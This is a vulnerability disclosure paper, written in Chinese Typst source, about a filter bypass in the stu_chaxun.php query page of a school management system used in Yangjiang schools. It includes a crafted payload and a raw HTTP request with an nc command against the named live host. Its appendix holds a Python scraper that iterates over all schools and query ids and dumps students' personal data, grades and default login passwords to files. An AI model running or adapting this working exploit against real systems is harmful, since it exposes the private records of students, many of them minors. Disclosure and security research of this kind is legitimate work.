#import "@preview/charged-ieee:0.1.0": ieee

#show: ieee.with(
  title: [qy.yjzqy.net Filter Bypass Vulnerability Disclosure],
  authors: (
    (
      name: "Zhang Bingwu",
      organization: [Yangjiang No.1 High School],
      email: "xtex@xtexx.eu.org",
      url: "xtexx.eu.org"
    ),
  ),
  abstract: [
    启业网作为被阳江市众多初高中学校使用的综合管理系统，在过去多年中，被广泛应用于各学校的校内信息公示、考试成绩公示、数据收集和分析等场景。尽管其并不开放源代码，我仍通过常规的、面向黑盒的审计方式，在不影响平台服务的前提下，发现了该平台的“信息查询”功能存在数据访问过滤绕过漏洞。
  ],
  bibliography: bibliography(("refs.yaml", "refs.bib")),
)

= 背景

启业网#cite(<qyw2019>)作为被阳江市众多初高中学校使用的综合管理系统，在过去多年中，被广泛应用于各学校的校内信息公示、考试成绩公示、数据收集和分析等场景。其“信息查询”功能中，通过给定个人信息，可以查询到更多信息，但我发现该功能会在不提供过滤信息的情况下允许匿名使用者访问所有数据。

= 威胁模型

我依据现实场景，假设攻击者可以正常地通过HTTP协议#cite(<rfc7230>)访问qy.yjzqy.net域名的TCP/80与TCP/9090端口。

= 背景分析

对启业网在TCP/9090上响应的HTML#cite(<rfc2854>)文本进行分析，可以发现，这些文本并不是规范的HTML文本，同时，HTTP响应也没有正确的设置带有`charset`的`Content-Type`标头#cite(<rfc7230>)。
容易发现，网站没有面向程序的API接口，所有表单内容均通过内容类型为application/x-www-form-urlencoded的POST请求发送至服务器的PHP脚本#cite(<php>)进行处理，随后服务器将会话数据保存在PHP session中，所有内容均由PHP在预处理阶段直接插入到HTML文本中。

由于网站响应的HTML文本非常不规范，导致页面内容也非常混乱，可以注意到，在“信息查询”功能中，提交查询请求时，查询数据所使用的信息的种类名称也会被提交。同时，查询按钮所显示的文本也会被提交。

@examplegoodquerypayload 展示了一个正常的查询载荷，其中包含了`xjh`、`name`、`zkzh`和`chaxun`四个常量值。

#figure(
  rect[```
  xjh=%D0%D5%C3%FB&xjh_inf=test
  &name=%D0%D4%B1%F0&name_inf=test
  &zkzh=%C9%ED%B7%DD%D6%A4%BA%C5&zkzh_inf=test
  &chaxun=%B2%E9%D1%AF&guanxi=1&xmid=133
  ```],
  caption: [一个正常的查询载荷]
) <examplegoodquerypayload>

= 特性

在移除查询载荷中的所有常量值后，我发现查询时服务器会无视除`xmid`以外的所有查询参数，包括其中用于选择数据的查询参数，并返回所有数据。

经过进一步测试，我发现`stu_chaxun.php`这一查询脚本具有以下性质：

+ 在移除索引信息对应的常量值后，信息值参数会被忽略，且索引时会忽略这一条件。
  例如，@examplegoodquerypayload 中，`xjh`的值为“姓名”，移除`xjh`参数后，`xjh_inf`参数会被忽略并可被省略。
+ 被忽略的信息列不会参与索引，提供的其他信息仍以“和（与）”的关系参与查询过程。
  例如，`name`和`zkzh`被发送但`xjh`被移除时，只要`name`和`zkzh`两列对应的信息同时匹配，结果行就会被选中。
+ `chaxun`与`guanxi`字段可被移除，不影响查询。
+ 执行查询时，至少任一`XXX_inf`字段必须被指定，即使对应的`XXX`字段不存在，否则请求不会被视为查询。
+ 在查询时，若所有常量字段被省略，所有数据都会被返回。
+ 可能参与查询的列始终不会出现在查询结果中。
+ 任何可能出现在查询结果中的列都不可被用于查询。

= 利用

== 理论可行性

如 @alldataquerypayload 所示，利用上述性质，我们可以通过构造包含任意数据的`XXX_inf`字段且不包含任何常量字段的请求载荷，从服务器获取所有的数据记录。

#figure(
  rect[```
  xjh_inf=test&name_inf=test&zkzh_inf=test
  &chaxun=%B2%E9%D1%AF&guanxi=1&xmid=133
  ```],
  caption: [一个能够获得所有数据的查询载荷]
) <alldataquerypayload>

通过此种方式获取数据，由于数据返回时的无序性，在忽略服务端实现的处理时间的情况下，对特定返回数据列进行访问的时间复杂度为$O(n)$，在使用$m$叉B+树进行搜索优化时，理论时间复杂度可以被优化为$O(log_2 m dot log_m N)$。

== 实践可行性

@examplealldatareq 展示了一个在`xmid` 133失效前可以获得阳江一中2026届高一第二学期所有人分班信息的HTTP#cite(<rfc7230>)请求。
可以通过如下方式复现：
```bash
nc qy.yjzqy.net 9090
（粘贴下方的的请求体内容，后回车）
```

#figure(
  rect[```
POST /sc/yjyz/stu_chaxun.php HTTP/1.1
Host: qy.yjzqy.net:9090
Accept: text/html
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

xjh_inf=test&name_inf=test&zkzh_inf=test
&chaxun=%B2%E9%D1%AF&guanxi=1&xmid=133
  ```],
  caption: [一个能够获得xmid=133所有数据的HTTP#cite(<rfc7230>)请求]
) <examplealldatareq>

附录中附有一个用Python实现的爬虫，它可以从服务器转储所有数据。

== 在野利用
未观察到有在野利用。

= 总结

通过发送特定的请求载荷，我们实现了从服务器获取所有“信息查询”中的非索引用数据，进而可以获得使用学校的部分学生的个人基本信息、成绩及用于登陆成绩查询平台的账号与默认密码。
这些数据通常被视为不应公开的个人数据，因而我认为所有既定攻击目标均已达成。

= 致谢
Thanks to the person who created the Qiyewang. Thanks to the PHP Group for creating PHP Hypertext Preprocessor.
Thanks to myself.

= 附录

```py
#!/usr/bin/env python3
# SPDX-License-Identifier: AFL-3.0
# Author: xtex <xtex@xtexx.eu.org>
# This program is licensed under Academic Free License v3.0.
import requests
from bs4 import BeautifulSoup, Tag
import os
import json


def getAllSchool() -> set[tuple[str, str]]:
    r = requests.get("http://qy.yjzqy.net:9090/list/link_qy.php")
    r.raise_for_status()
    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
    return set(
        [
            (
                x.attrs["href"]
                .removeprefix("http://qy.yjzqy.net:9090/sc/")
                .removesuffix("/"),
                x.text,
            )
            for x in soup.select("table td a")
        ]
    )


def getInfoQueries(sch: str) -> set[tuple[int, str]]:
    r = requests.get(f"http://qy.yjzqy.net:9090/sc/{sch}/stu_chaxun.php")
    r.raise_for_status()
    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
    return set(
        [
            (int(x.attrs["value"]), x.text.strip())
            for x in soup.select("table select[name='xmid'] option")
        ]
    )


def getAllData(sch: str, q: int) -> list[dict]:
    r = requests.post(
        f"http://qy.yjzqy.net:9090/sc/{sch}/stu_chaxun.php",
        data={
            "xjh_inf": "a",
            "name_inf": "a",
            "zkzh_inf": "a",
            "guanxi": "1",
            "xmid": str(q),
        },
    )
    r.raise_for_status()
    soup = BeautifulSoup(r.content, "html.parser", from_encoding="GB2312")
    els = list(soup.select("td.STYLE11"))[1].parent.parent
    result = list()
    data = {}
    for tr in els:
        tds = list(filter(lambda x: isinstance(x, Tag), list(tr)))
        if len(tds) == 1:
            if "符合条件信息" in tr.text:
                data["TITLE"] = tr.text.strip()
            else:
                result.append(data)
                data = {}
        elif len(tds) == 2:
            data[tds[0].text.strip()] = tds[1].text.strip()
        elif len(tds) == 0:
            pass
        else:
            raise RuntimeError(tds)
    return result


allsch = getAllSchool()
for sch, schname in allsch:
    print("SCHOOL", sch, schname)
    schpath = f"out/{sch}{schname}"
    os.makedirs(schpath, exist_ok=True)
    if (
        sch == "yjsyxx"
    ):  # 服务器返回：无法连接数据库......http://qy.yjzqy.net:9090/sc/yjsyxx/
        continue
    qs = getInfoQueries(sch)
    for q, qname in qs:
        print("QUERY", sch, schname, q, qname)
        data = getAllData(sch, q)
        with open(f"{schpath}/{q}-{qname}.json", "w") as fp:
            json.dump(data, fp, indent=4, ensure_ascii=False)

```
